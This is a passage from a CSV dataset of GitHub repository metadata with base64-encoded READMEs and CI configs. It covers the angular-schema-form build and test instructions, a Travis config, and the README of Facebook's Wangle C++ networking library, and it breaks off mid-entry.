name,id,description,language,open_issues,stargazers_count,topics,watchers,fork,forks_url,readme,config,travis0,travis1,travis2,travis3,travis4,travis5,travis6,travis7,travis8,travis9,travis10,travis11,travis12,travis13,travis14,travis15,travis16,travis17,travis18,travis19,travis20,travis21,travis22,travis23,gitlab0,gitlab1,gitlab2,gitlab3,gitlab4,gitlab5,gitlab6,gitlab7,gitlab8,gitlab9,gitlab10,gitlab11,gitlab12,gitlab13,gitlab14,gitlab15,gitlab16,gitlab17,gitlab18,gitlab19,gitlab20,gitlab21,gitlab22,gitlab23,jenkinsPipeline0,jenkinsPipeline1,jenkinsPipeline2,jenkinsPipeline3,jenkinsPipeline4,jenkinsPipeline5,jenkinsPipeline6,jenkinsPipeline7,jenkinsPipeline8,jenkinsPipeline9,jenkinsPipeline10,jenkinsPipeline11,jenkinsPipeline12,jenkinsPipeline13,jenkinsPipeline14,jenkinsPipeline15,jenkinsPipeline16,jenkinsPipeline17,jenkinsPipeline18,jenkinsPipeline19,jenkinsPipeline20,jenkinsPipeline21,jenkinsPipeline22,jenkinsPipeline23,cirrus0,cirrus1,cirrus2,cirrus3,cirrus4,cirrus5,cirrus6,cirrus7,cirrus8,cirrus9,cirrus10,cirrus11,cirrus12,cirrus13,cirrus14,cirrus15,cirrus16,cirrus17,cirrus18,cirrus19,cirrus20,cirrus21,cirrus22,cirrus23,github0,github1,github2,github3,github4,github5,github6,github7,github8,github9,github10,github11,github12,github13,github14,github15,github16,github17,github18,github19,github20,github21,github22,github23,cds0,cds1,cds2,cds3,cds4,cds5,cds6,cds7,cds8,cds9,cds10,cds11,cds12,cds13,cds14,cds15,cds16,cds17,cds18,cds19,cds20,cds21,cds22,cds23,azure0,azure1,azure2,azure3,azure4,azure5,azure6,azure7,azure8,azure9,azure10,azure11,azure12,azure13,azure14,azure15,azure16,azure17,azure18,azure19,azure20,azure21,azure22,azure23,circleci0,circleci1,circleci2,circleci3,circleci4,circleci5,circleci6,circleci7,circleci8,circleci9,circleci10,circleci11,circleci12,circleci13,circleci14,circleci15,circleci16,circleci17,circleci18,circleci19,circleci20,circleci21,circleci22,circleci23,bitbucket0,bitbucket1,bitbucket2,bitbucket3,bitbucket4,bitbucket5,bitbucket6,bitbucket7,bitbucket8,bitbucket9,bitbucket10,bitbucket11,bitbucket12,bitbucket13,bitbucket14,bitbucket15,bitbucket16,bitbucket17,bitbucket18,bitbucket19,bitbucket20,bitbucket21,bitbucket22,bitbucket23
IDEuMi54CiAgIGhhcyBzb21lIGxpbWl0YXRpb24uIFNlZSBba25vd24gbGlt
aXRhdGlvbnNdKGRvY3Mva25vd25saW1pdGF0aW9ucy5tZCkuCjIuIFthbmd1
bGFyLXNhbml0aXplXShodHRwczovL2RvY3MuYW5ndWxhcmpzLm9yZy9hcGkv
bmdTYW5pdGl6ZSkKMy4gW3R2NF0oaHR0cHM6Ly9naXRodWIuY29tL2dlcmFp
bnRsdWZmL3R2NCkKNC4gW2Jvb3RzdHJhcCAzXShodHRwOi8vZ2V0Ym9vdHN0
cmFwLmNvbS8pCgpJZiB5b3UgaW5zdGFsbCB2aWEgYm93ZXIgeW91IGdldCBh
bGwgb2YgdGhlIGFib3ZlIGV4Y2VwdCBib290c3RyYXAgc2luY2Ugd2UKZG9u
J3Qgd2FudCB0byBwdXNoIGEgY2VydGFpbiB2ZXJzaW9uIG9yIGZsYXZvciBv
biB5b3UuIEFsc28gbWFrZQpzdXJlIHlvdSBnb3QgdGhlIGFuZ3VsYXIgdmVy
c2lvbiB5b3UgYWN0dWFsbHkgd2FudC4KCiMjIyMgQWRkaXRpb25hbCBkZXBl
bmRlbmNpZXMKCjEuIElmIHlvdSdkIGxpa2UgdG8gdXNlIGRyYWctYW5kLWRy
b3AgcmVvcmRlcmluZyBvZiBhcnJheXMsIHlvdSdsbCBhbHNvIG5lZWQgW3Vp
LXNvcnRhYmxlXShodHRwczovL2dpdGh1Yi5jb20vYW5ndWxhci11aS91aS1z
b3J0YWJsZSkgYW5kIGl0cyBbalF1ZXJ5VUldKGh0dHA6Ly9qcXVlcnl1aS5j
b20vKSBkZXBlbmRlbmNpZXMuIFNlZSB0aGUgKnVpLXNvcnRhYmxlKiBkb2N1
bWVudGF0aW9uIGZvciBkZXRhaWxzIGFib3V0IHdoaWNoIHBhcnRzIG9mIGpR
dWVyeVVJIGFyZSBuZWVkZWQuIFlvdSBjYW4gc2FmZWx5IGlnbm9yZSB0aGVz
ZSBpZiB5b3UgZG9uJ3QgbmVlZCByZW9yZGVyaW5nLgoyLiBTY2hlbWEgRm9y
bSBwcm92aWRlcyB0YWJiZWQgYXJyYXlzIHRocm91Z2ggdGhlIGZvcm0gdHlw
ZSBgdGFiYXJyYXlgLiBUYWIgYXJyYXlzIGRlZmF1bHQgdG8gdGFicyBvbiB0
aGUgbGVmdCBzaWRlLiBGb3IgdGhlc2UgdG8gd29yaywgeW91J2xsIG5lZWQg
dG8gaW5jbHVkZSB0aGUgQ1NTIGZyb20gW2Jvb3RzdHJhcC12ZXJ0aWNhbC10
YWJzXShodHRwczovL2dpdGh1Yi5jb20vZGJ0ZWsvYm9vdHN0cmFwLXZlcnRp
Y2FsLXRhYnMpLiBIb3dldmVyLCB5b3Ugd29uJ3QgbmVlZCBCb290c3RyYXAg
VmVydGljYWwgVGFicyBmb3IgaG9yaXpvbnRhbCB0YWJzICh0aGUgYHRhYlR5
cGU6ICJ0b3AiYCBvcHRpb24pLgoKVGhlIG1pbmlmaWVkIGZpbGVzIGluY2x1
ZGUgdGVtcGxhdGVzIC0gbm8gbmVlZCB0byBsb2FkIGFkZGl0aW9uYWwgSFRN
TCBmaWxlcy4KCiMjIyBTY3JpcHQgTG9hZGluZwoKU2NoZW1hIGZvcm0gaXMg
c3BsaXQgaW50byB0d28gbWFpbiBmaWxlcywgYGRpc3Qvc2NoZW1hLWZvcm0u
bWluLmpzYCBhbmQKYGRpc3QvYm9vdHN0cmFwLWRlY29yYXRvci5taW4uanNg
IGFuZCB0aGV5IG5lZWQgYmUgbG9hZGVkIGluIHRoYXQgb3JkZXIuIEFuZ3Vs
YXJKUywKW3R2NF0oaHR0cHM6Ly9naXRodWIuY29tL2dlcmFpbnRsdWZmL3R2
NCkgYW5kIFtvYmplY3RwYXRoXShodHRwczovL2dpdGh1Yi5jb20vbWlrZS1t
YXJjYWNjaS9vYmplY3RwYXRoKQphbHNvIG5lZWRzIHRvIGJlIGxvYWRlZCAq
YmVmb3JlKiBTY2hlbWEgRm9ybS4KCmBgYGh0bWwKPHNjcmlwdCB0eXBlPSJ0
ZXh0L2phdmFzY3JpcHQiIHNyYz0iYm93ZXJfY29tcG9uZW50cy9hbmd1bGFy
L2FuZ3VsYXIubWluLmpzIj48L3NjcmlwdD4KPHNjcmlwdCB0eXBlPSJ0ZXh0
L2phdmFzY3JpcHQiIHNyYz0iYm93ZXJfY29tcG9uZW50cy9hbmd1bGFyLXNh
bml0aXplL2FuZ3VsYXItc2FuaXRpemUubWluLmpzIj48L3NjcmlwdD4KPHNj
cmlwdCB0eXBlPSJ0ZXh0L2phdmFzY3JpcHQiIHNyYz0iYm93ZXJfY29tcG9u
ZW50cy90djQvdHY0LmpzIj48L3NjcmlwdD4KPHNjcmlwdCB0eXBlPSJ0ZXh0
L2phdmFzY3JpcHQiIHNyYz0iYm93ZXJfY29tcG9uZW50cy9vYmplY3RwYXRo
L2xpYi9PYmplY3RQYXRoLmpzIj48L3NjcmlwdD4KPHNjcmlwdCB0eXBlPSJ0
ZXh0L2phdmFzY3JpcHQiIHNyYz0iYm93ZXJfY29tcG9uZW50cy9hbmd1bGFy
LXNjaGVtYS1mb3JtL2Rpc3Qvc2NoZW1hLWZvcm0ubWluLmpzIj48L3Njcmlw
dD4KPHNjcmlwdCB0eXBlPSJ0ZXh0L2phdmFzY3JpcHQiIHNyYz0iYm93ZXJf
Y29tcG9uZW50cy9hbmd1bGFyLXNjaGVtYS1mb3JtL2Rpc3QvYm9vdHN0cmFw
LWRlY29yYXRvci5taW4uanMiPjwvc2NyaXB0PgpgYGAKCiMjIyBNb2R1bGUg
bG9hZGluZwpEb24ndCBmb3JnZXQgdG8gbG9hZCB0aGUgYHNjaGVtYUZvcm1g
IG1vZHVsZSBvciBub3RoaW5nIHdpbGwgaGFwcGVuLgoKYGBgamF2YXNjcmlw
dAphbmd1bGFyLm1vZHVsZSgnbXlNb2R1bGUnLCBbJ3NjaGVtYUZvcm0nXSk7
CmBgYAoKIyMgQWRkLW9ucwpUaGVyZSBhcmUgc2V2ZXJhbCBhZGQtb25zIGF2
YWlsYWJsZSwgZm9yIGEgZnVsbCBsaXN0IHNlZSB0aGUgW3dlYiBwYWdlXSho
dHRwOi8vc2NoZW1hZm9ybS5pby8jL3RoaXJkLXBhcnR5LWFkZG9ucykuCllv
dXIgY2FuIGFsc28gW2NyZWF0ZSB5b3VyIG93biBhZGQtb25zIV0oZG9jcy9l
eHRlbmRpbmcubWQpCgojIyBDb250cmlidXRpbmcKQ29udHJpYnV0aW9ucyBh
cmUgd2VsY29tZSEgUGxlYXNlIHNlZSBbQ29udHJpYnV0aW5nLm1kXShDT05U
UklCVVRJTkcubWQpIGZvciBtb3JlIGluZm8uCgojIyBCdWlsZGluZwpUaGUg
bmV3IFdlYnBhY2sgY29tcGlsYXRpb24gaGFzIG1hZGUgaXQgZWFzaWVyIHRv
IG1hbmFnZSBmaWxlcyBhbmQgY29kZSBhbmQgcnVuIGJ1aWxkCnNjcmlwdHMs
IGJ1dCBpdCBpcyBzdGlsbCBub3QgZWFzeSBlbm91Z2ggZm9yIHVzZXJzIHVu
ZmFtaWxpYXIgd2l0aCBpdC4uLiB5ZXQuCgoqKk5PVEUqKiBpbiBvcmRlciB0
byBidWlsZCBzaW11bHRhbmVvdXNseSB3aXRoIGBgYGpzb24tc2NoZW1hLWZv
cm0tY29yZWBgYCB5b3UgbXVzdCBoYXZlIGl0IGNsb25lZAphcyBhIHNpYmxp
bmcgZGlyZWN0b3J5IHRvIHRoaXMgb25lICoqT1IqKiBucG0gaW5zdGFsbCB0
aGUgdmVyc2lvbiB5b3Ugd2lzaCB0byBidWlsZCB3aXRoLgoKV2VicGFjayBu
b3cgZ2VuZXJhdGVzIGEgaGVhZGVyIHRvIGluZGljYXRlIHZlcnNpb24gYW5k
IGRhdGUgb2YgYnVpbGQuICoqRG8gbm90IGNyZWF0ZSBQUiB3aXRoIHRoZSBE
SVNUIGZvbGRlci4qKgoKIyMgQnJhbmNoIFN0YXR1cyAmIE5ldyBBZGQtT24K
VGhpcyBicmFuY2ggd2lsbCBiZSB0aGUgKipuZXh0IHZlcnNpb24gb2YgQW5n
dWxhciBTY2hlbWEgRm9ybSoqLCBjdXJyZW50bHkgcGxlYXNlIHVzZQp0aGUg
KipleGFtcGxlcy9leGFtcGxlLmh0bWwqKiBmaWxlIGFzIHRoZSBiZXN0IGV4
YW1wbGUgdG8gZ2V0IHRoZSBmcmFtZXdvcmsgd29ya2luZy4KClRoZSBleGFt
cGxlIHVzZXMgKiphbmd1bGFyLXNjaGVtYS1mb3JtLmpzKiogYW5kICoqYW5n
dWxhci1zY2hlbWEtZm9ybS1ib290c3RyYXAuanMqKiBmb3IgdGhlCnZlcnNp
b24gb2YgdGhlIGNvZGUgaXQgZXhlY3V0ZXMsIGlmIHlvdSB3YW50IHlvdXIg
cGFnZSB0byBiZWhhdmUgdGhlIHNhbWUgeW91Cm9idmlvdXNseSBuZWVkIHRo
ZSBzYW1lIHZlcnNpb24hCgojIyMgQWRkLW9uClRvIHNlZSBob3cgdG8gbWFr
ZSBhbiAqKmFkZC1vbioqIHdvcmsgSSBoYXZlIG5vdyBpbmNsdWRlZCB0aGUg
KipjYWxjdWxhdGUqKiBhZGQtb24gZmlsZSB3aXRoaW4gdGhlICoqZXhhbXBs
ZXMvYWRkLW9uKiogZGlyZWN0b3J5LgoKIyMgVGVzdHMKVW5pdCB0ZXN0cyBh
cmUgcnVuIHdpdGggW2thcm1hXShodHRwOi8va2FybWEtcnVubmVyLmdpdGh1
Yi5pbykgYW5kIHdyaXR0ZW4gdXNpbmcKW21vY2hhXShodHRwOi8vbW9jaGFq
cy5vcmcvKSwgW2NoYWldKGh0dHA6Ly9jaGFpanMuY29tLykgYW5kCltzaW5v
bl0oaHR0cDovL3Npbm9uanMub3JnLykKClRvIHJ1biB0aGUgdGVzdHM6Cgox
LiBJbnN0YWxsIGFsbCBkZXBlbmRlbmNpZXMgdmlhIE5QTS4KMi4gSW5zdGFs
bCBkZXYgZGVwZW5kZW5jaWVzIHdpdGggYm93ZXIuCjMuIEluc3RhbGwgdGhl
IEthcm1hIENMSS4KNC4gUnVuIHRoZSB0ZXN0cyB1c2luZyBgbnBtIHRlc3Rg
LgoKYGBgYmFzaAokIG5wbSBpbnN0YWxsCiQgYm93ZXIgaW5zdGFsbAokIG5w
bSB0ZXN0CmBgYAo=
",,"bGFuZ3VhZ2U6IG5vZGVfanMKbm9kZV9qczoKICAtIDYKCmJlZm9yZV9zY3Jp
cHQ6CiAgLSBucG0gaW5zdGFsbCAtZyBib3dlcgogIC0gYm93ZXIgaW5zdGFs
bAoKc3VkbzogZmFsc2UK
",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
b'wangle',27889694,"b'Wangle is a framework providing a set of common client/server abstractions for building services in a consistent, modular, and composable way.'",b'C++',46,2392,,2392,False,b'https://api.github.com/repos/facebook/wangle/forks',"WyFbVHJhdmlzIEJ1aWxkIFN0YXR1c10oaHR0cHM6Ly9hcGkudHJhdmlzLWNp
LmNvbS9mYWNlYm9vay93YW5nbGUuc3ZnP2JyYW5jaD1tYXN0ZXIpXShodHRw
czovL3RyYXZpcy1jaS5jb20vZmFjZWJvb2svd2FuZ2xlKQpbIVtDSSBTdGF0
dXNdKGh0dHBzOi8vZ2l0aHViLmNvbS9mYWNlYm9vay93YW5nbGUvd29ya2Zs
b3dzL0NJL2JhZGdlLnN2Zz9icmFuY2g9bWFzdGVyKV0oaHR0cHM6Ly9naXRo
dWIuY29tL2ZhY2Vib29rL3dhbmdsZS9hY3Rpb25zP3dvcmtmbG93PUNJKQo8
c2VjdGlvbiBjbGFzcz0iZGV4X2d1aWRlIj48aDEgY2xhc3M9ImRleF90aXRs
ZSI+V2FuZ2xlPC9oMT48c2VjdGlvbiBjbGFzcz0iZGV4X2RvY3VtZW50Ij48
aDE+PC9oMT48cCBjbGFzcz0iZGV4X2ludHJvZHVjdGlvbiI+QysrIG5ldHdv
cmtpbmcgbGlicmFyeTwvcD48cD5XYW5nbGUgaXMgYSBsaWJyYXJ5IHRoYXQg
bWFrZXMgaXQgZWFzeSB0byBidWlsZCBwcm90b2NvbHMsIGFwcGxpY2F0aW9u
IGNsaWVudHMsIGFuZCBhcHBsaWNhdGlvbiBzZXJ2ZXJzLjwvcD4KCjxwPkl0
JiMwMzk7cyBsaWtlIE5ldHR5ICsgRmluYWdsZSBzbW9vc2hlZCB0b2dldGhl
ciwgYnV0IGluIEMrKzwvcD4KCiMjIEJ1aWxkaW5nIGFuZCBJbnN0YWxsaW5n
CgpUaGUgbWFpbiBkZXBlbmRlbmNpZXMgYXJlOgoqIFRoZSBmb2xseSBsaWJy
YXJ5IGZyb20gaHR0cHM6Ly9naXRodWIuY29tL2ZhY2Vib29rL2ZvbGx5Ciog
VGhlIGZpenogbGlicmFyeSBmcm9tIGh0dHBzOi8vZ2l0aHViLmNvbS9mYWNl
Ym9va2luY3ViYXRvci9maXp6CiogQ01ha2UKKiBPcGVuU1NMLCBhdCBsZWFz
dCB2ZXJzaW9uIDEuMC4yKywgcHJlZmVyYWJseSB3aXRoIFRMUyBleHRlbnNp
b24gc3VwcG9ydC4KCk9uY2UgZm9sbHkgaXMgaW5zdGFsbGVkLCBydW4gdGhl
IGZvbGxvd2luZyBpbnNpZGUgdGhlIHdhbmdsZSBkaXJlY3RvcnkgdG8gYnVp
bGQsIHRlc3QsIGFuZCBpbnN0YWxsIHdhbmdsZToKYGBgCmNtYWtlIC4KbWFr
ZQpjdGVzdApzdWRvIG1ha2UgaW5zdGFsbApgYGAKCiMjIFR1dG9yaWFsCgpU
aGVyZSBpcyBhIHR1dG9yaWFsIFtoZXJlXSh0dXRvcmlhbC5tZCkgdGhhdCBl
eHBsYWlucyB0aGUgYmFzaWNzIG9mIFdhbmdsZSBhbmQgc2hvd3MgaG93IHRv
IGJ1aWxkIGFuIGVjaG8gc2VydmVyL2NsaWVudC4KCiMjIEV4YW1wbGVzCgpT
ZWUgdGhlIGV4YW1wbGVzLyBkaXJlY3RvcnkgZm9yIHNvbWUgZXhhbXBsZSBX
YW5nbGUgc2VydmVycyBhbmQgY2xpZW50cwoKIyMgTGljZW5zZQpXYW5nbGUg
aXMgQXBhY2hlIDIuMC1saWNlbnNlZC4KCiMjIENvbnRyaWJ1dGluZwpTZWUg
dGhlIENPTlRSSUJVVElORyBmaWxlIGZvciBob3cgdG8gaGVscCBvdXQuCgoj
IyBEb2N1bWVudGF0aW9uCgo8cD5XYW5nbGUgaW50ZXJmYWNlcyBhcmUgYXN5
bmNocm9ub3VzLiAgSW50ZXJmYWNlcyBhcmUgY3VycmVudGx5IGJhc2VkIG9u
IDxhIGhyZWY9Imh0dHBzOi8vZ2l0aHViLmNvbS9mYWNlYm9vay9mb2xseS90
cmVlL21hc3Rlci9mb2xseS9mdXR1cmVzIj5GdXR1cmVzPC9hPiwgYnV0IHdl
JiMwMzk7cmUgYWxzbyBleHBsb3JpbmcgaG93IHRvIHN1cHBvcnQgZmliZXJz
PC9wPgoKPGgyIGlkPSJjbGllbnQtc2VydmVyLWFic3RyYWN0aW8iPkNsaWVu
dCAvIFNlcnZlciBhYnN0cmFjdGlvbiA8YSBocmVmPSIjY2xpZW50LXNlcnZl
ci1hYnN0cmFjdGlvIiBjbGFzcz0iaGVhZGVyTGluayI+IzwvYT48L2gyPgoK
PHA+WW91JiMwMzk7cmUgcHJvYmFibHkgZmFtaWxpYXIgd2l0aCBKYXZhJiMw
Mzk7cyBOZXR0eSwgb3IgUHl0aG9uJiMwMzk7cyB0d2lzdGVkLCBvciBzaW1p
bGFyIGxpYnJhcmllcy48L3A+Cgo8cD5JdCBpcyBidWlsdCBvbiB0b3Agb2Yg
Zm9sbHkvYXN5bmMvaW8sIHNvIGl0JiMwMzk7cyBvbmUgbGV2ZWwgdXAgdGhl
IHN0YWNrIGZyb20gdGhhdCAob3Igc2ltaWxhciBhYnN0cmFjdGlvbnMgbGlr
ZSBib29zdDo6YXNpbyk8L3A+Cgo8cD5TZXJ2ZXJCb290c3RyYXAgLSBlYXNp
bHkgbWFuYWdlIGNyZWF0aW9uIG9mIHRocmVhZHBvb2xzIGFuZCBwaXBlbGlu
ZXM8L3A+Cgo8cD5DbGllbnRCb290c3RyYXAgLSB0aGUgc2FtZSBmb3IgY2xp
ZW50czwvcD4KCjxwPlBpcGVsaW5lIC0gc2V0IHVwIGEgc2VyaWVzIG9mIGhh
bmRsZXJzIHRoYXQgbW9kaWZ5IHlvdXIgc29ja2V0IGRhdGE8L3A+Cgo8aDIg
aWQ9InJlcXVlc3QtcmVzcG9uc2UtYWJzdHJhYyI+UmVxdWVzdCAvIFJlc3Bv
bnNlIGFic3RyYWN0aW9uIDxhIGhyZWY9IiNyZXF1ZXN0LXJlc3BvbnNlLWFi
c3RyYWMiIGNsYXNzPSJoZWFkZXJMaW5rIj4jPC9hPjwvaDI+Cgo8cD5UaGlz
IGlzIHJvdWdobHkgZXF1aXZhbGVudCB0byB0aGUgPGEgaHJlZj0iaHR0cHM6
Ly90d2l0dGVyLmdpdGh1Yi5pby9maW5hZ2xlLyIgdGFyZ2V0PSJfYmxhbmsi
PkZpbmFnbGU8L2E+IGxpYnJhcnkuPC9wPgoKPHA+QWltcyB0byBwcm92aWRl
IGVhc3kgdGVzdGluZywgbG9hZCBiYWxhbmNpbmcsIGNsaWVudCBwb29saW5n
LCByZXRyeSBsb2dpYywgZXRjLiAgZm9yIGFueSByZXF1ZXN0L3Jlc3BvbnNl
IHR5cGUgc2VydmljZSAtIGkuZS4gdGhyaWZ0LCBodHRwLCBldGMuPC9wPgoK
PHA+U2VydmljZSAtIGEgbWF0Y2hlZCBpbnRlcmZhY2UgYmV0d2VlbiBjbGll
bnQvc2VydmVyLiAgQSBzZXJ2ZXIgd2lsbCBpbXBsZW1lbnQgdGhpcyBpbnRl
cmZhY2UsIGFuZCBhIGNsaWVudCB3aWxsIGNhbGwgaW4gdG8gaXQuICBUaGVz
ZSBhcmUgcHJvdG9jb2wtc3BlY2lmaWM8L3A+Cgo8cD5TZXJ2aWNlRmlsdGVy
IC0gYSBnZW5lcmljIGZpbHRlciBvbiBhIHNlcnZpY2UuIEV4YW1wbGVzOiBz
dGF0cywgcmVxdWVzdCB0aW1lb3V0cywgcmF0ZSBsaW1pdGluZzwvcD4KCjxw
PlNlcnZpY2VGYWN0b3J5IC0gQSBmYWN0b3J5IHRoYXQgY3JlYXRlcyBjbGll
bnQgY29ubmVjdGlvbnMuICBBbnkgcHJvdG9jb2wgc3BlY2lmaWMgc2V0dXAg
Y29kZSBnb2VzIGhlcmU8L3A+Cgo8cD5TZXJ2aWNlRmFjdG9yeUZpbHRlciAt
IEdlbmVyaWMgZmlsdGVycyB0aGF0IGNvbnRyb2wgaG93IGNvbm5lY3Rpb25z
IGFyZSBjcmVhdGVkLiAgQ2xpZW50IGV4YW1wbGVzOiBsb2FkIGJhbGFuY2lu
ZywgcG9vbGluZywgIGlkbGUgdGltZW91dHMsIG1hcmtkb3ducywgZXRjLjwv
cD48L3NlY3Rpb24+PHNlY3Rpb24gY2xhc3M9ImRleF9kb2N1bWVudCI+PGgx
PlNlcnZlckJvb3RzdHJhcDwvaDE+PHAgY2xhc3M9ImRleF9pbnRyb2R1Y3Rp
b24iPkVhc2lseSBjcmVhdGUgYSBuZXcgc2VydmVyPC9wPjxwPlNlcnZlckJv
b3RzdHJhcCBkb2VzIHRoZSB3b3JrIHRvIHNldCB1cCBvbmUgb3IgbXVsdGlw
bGUgYWNjZXB0b3IgdGhyZWFkcywgYW5kIG9uZSBvciBtdWx0aXBsZSBzZXRz
IG9mIElPIHRocmVhZHMuICBUaGUgdGhyZWFkIHBvb2xzIGNhbiBiZSB0aGUg
c2FtZS4gIFNPX1JFVVNFUE9SVCBpcyBhdXRvbWF0aWNhbGx5IHN1cHBvcnRl
ZCBmb3IgbXVsdGlwbGUgYWNjZXB0IHRocmVhZHMuIHRjcCBpcyBtb3N0IGNv
bW1vbiwgYWx0aG91Z2ggdWRwIGlzIGFsc28gc3VwcG9ydGVkLjwvcD4KCjxo
MiBpZD0ibWV0aG9kcyI+TWV0aG9kcyA8YSBocmVmPSIjbWV0aG9kcyIgY2xh
c3M9ImhlYWRlckxpbmsiPiM8L2E+PC9oMj4KCjxwPjxzdHJvbmc+Y2hpbGRQ
aXBlbGluZShQaXBlbGluZUZhY3RvcnkmbHQ7UGlwZWxpbmUmZ3Q7KTwvc3Ry
b25nPjwvcD4KCjxwPlNldHMgdGhlIHBpcGVsaW5lIGZhY3RvcnkgZm9yIGVh
Y2ggbmV3IGNvbm5lY3Rpb24uICBPbmUgcGlwZWxpbmUgcGVyIGNvbm5lY3Rp
b24gd2lsbCBiZSBjcmVhdGVkLjwvcD4KCjxwPjxzdHJvbmc+Z3JvdXAoSU9U
aHJlYWRQb29sRXhlY3V0b3IgYWNjZXB0LCBJT1RocmVhZFBvb2xFeGVjdXRv
ciBpbyk8L3N0cm9uZz48L3A+Cgo8cD5TZXRzIHRoZSB0aHJlYWQgcG9vbHMg
Zm9yIGFjY2VwdCBhbmQgaW8gdGhyZWFkIHBvb2xzLiAgSWYgbW9yZSB0aGFu
IG9uZSB0aHJlYWQgaXMgaW4gdGhlIGFjY2VwdCBncm91cCwgU09fUkVVU0VQ
T1JUIGlzIHVzZWQuICBEZWZhdWx0cyB0byBhIHNpbmdsZSBhY2NlcHQgdGhy
ZWFkLCBhbmQgb25lIGlvIHRocmVhZCBwZXIgY29yZS48L3A+Cgo8cD48c3Ry
b25nPmJpbmQoU29ja2V0QWRkcmVzcyksYmluZChwb3J0KTwvc3Ryb25nPjwv
cD4KCjxwPkJpbmRzIHRvIGEgcG9ydC4gQXV0b21hdGljYWxseSBzdGFydHMg
dG8gYWNjZXB0IGFmdGVyIGJpbmQuPC9wPgoKPHA+PHN0cm9uZz5zdG9wKCk8
L3N0cm9uZz48L3A+Cgo8cD5TdG9wcyBsaXN0ZW5pbmcgb24gYWxsIHNvY2tl
dHMuPC9wPgoKPHA+PHN0cm9uZz5qb2luKCk8L3N0cm9uZz48L3A+Cgo8cD5K
b2lucyBhbGwgdGhyZWFkcG9vbHMgLSBhbGwgY3VycmVudCByZWFkcyBhbmQg
d3JpdGVzIHdpbGwgYmUgY29tcGxldGVkIGJlZm9yZSB0aGlzIG1ldGhvZCBy
ZXR1cm5zLjwvcD4KCjxkaXYgY2xhc3M9InJlbWFya3VwLW5vdGUiPjxzcGFu
IGNsYXNzPSJyZW1hcmt1cC1ub3RlLXdvcmQiPk5PVEU6PC9zcGFuPiBob3dl
dmVyIHRoYXQgYm90aCBhY2NlcHQgYW5kIGlvIHRocmVhZCBwb29scyB3aWxs
IGJlIHN0b3BwZWQgdXNpbmcgdGhpcyBtZXRob2QsIHNvIHRoZSB0aHJlYWQg
cG9vbHMgY2FuJiMwMzk7dCBiZSBzaGFyZWQsIG9yIGNhcmUgbXVzdCBiZSB0
YWtlbiB1c2luZyBzaGFyZWQgcG9vbHMgZHVyaW5nIHNodXRkb3duLjwvZGl2
PgoKPHA+PHN0cm9uZz53YWl0Rm9yU3RvcCgpPC9zdHJvbmc+PC9wPgoKPHA+
V2FpdHMgZm9yIHN0b3AoKSB0byBiZSBjYWxsZWQgZnJvbSBhbm90aGVyIHRo
cmVhZC48L3A+Cgo8aDIgaWQ9Im90aGVyLW1ldGhvZHMiPk90aGVyIG1ldGhv
ZHMgPGEgaHJlZj0iI290aGVyLW1ldGhvZHMiIGNsYXNzPSJoZWFkZXJMaW5r
Ij4jPC9hPjwvaDI+Cgo8cD48c3Ryb25nPmNoYW5uZWxGYWN0b3J5KFNlcnZl
clNvY2tldEZhY3RvcnkpPC9zdHJvbmc+PC9wPgoKPHA+U2V0cyB1cCB0aGUg
dHlwZSBvZiBzZXJ2ZXIuICBEZWZhdWx0cyB0byBUQ1AgQXN5bmNTZXJ2ZXJT
b2NrZXQsIGJ1dCBBc3luY1VEUFNlcnZlclNvY2tldCBpcyBhbHNvIHN1cHBv
cnRlZCB0byByZWNlaXZlIHVkcCBtZXNzYWdlcy4gIEluIHByYWN0aWNlLCBT
ZXJ2ZXJCb290c3RyYXAgaXMgb25seSB1c2VmdWwgZm9yIHVkcCBpZiB5b3Ug
bmVlZCB0byBtdWx0aXBsZXggdGhlIG1lc3NhZ2VzIGFjcm9zcyBtYW55IHRo
cmVhZHMsIG9yIGhhdmUgVENQIGNvbm5lY3Rpb25zIGdvaW5nIG9uIGF0IHRo
ZSBzYW1lIHRpbWUsIGV0Yy4gIFNpbXBsZSB1c2FnZXMgb2YgQXN5bmNVRFBT
b2NrZXQgcHJvYmFibHkgZG9uJiMwMzk7dCBuZWVkIHRoZSBjb21wbGV4aXR5
IG9mIFNlcnZlckJvb3RzdHJhcC48L3A+Cgo8cD48c3Ryb25nPnBpcGVsaW5l
KFBpcGVsaW5lRmFjdG9yeSZsdDtBY2NlcHRQaXBlbGluZSZndDspPC9zdHJv
bmc+PC9wPgoKPHA+VGhpcyBwaXBlbGluZSBtZXRob2QgaXMgdXNlZCB0byBn
ZXQgdGhlIGFjY2VwdGVkIHNvY2tldCAob3IgdWRwIG1lc3NhZ2UpICpiZWZv
cmUqIGl0IGhhcyBiZWVuIGhhbmRlZCBvZmYgdG8gYW4gSU8gdGhyZWFkLiAg
VGhpcyBjYW4gYmUgdXNlZCB0byBzdGVlciB0aGUgYWNjZXB0IHRocmVhZCB0
byBhIHBhcnRpY3VsYXIgdGhyZWFkLCBvciBmb3IgbG9nZ2luZy48L3A+Cgo8
cD5TZWUgYWxzbyBBY2NlcHRSb3V0aW5nSGFuZGxlciBhbmQgUm91dGluZ0Rh
dGFIYW5kbGVyIGZvciBhZGRpdGlvbmFsIGhlbHAgaW4gcmVhZGluZyBkYXRh
IG9mZiBvZiB0aGUgYWNjZXB0ZWQgc29ja2V0IDxzdHJvbmc+YmVmb3JlPC9z
dHJvbmc+IGl0IGdldHMgYXR0YWNoZWQgdG8gYW4gSU8gdGhyZWFkLiAgVGhl
c2UgY2FuIGJlIHVzZWQgdG8gaGFzaCBpbmNvbWluZyBzb2NrZXRzIHRvIHNw
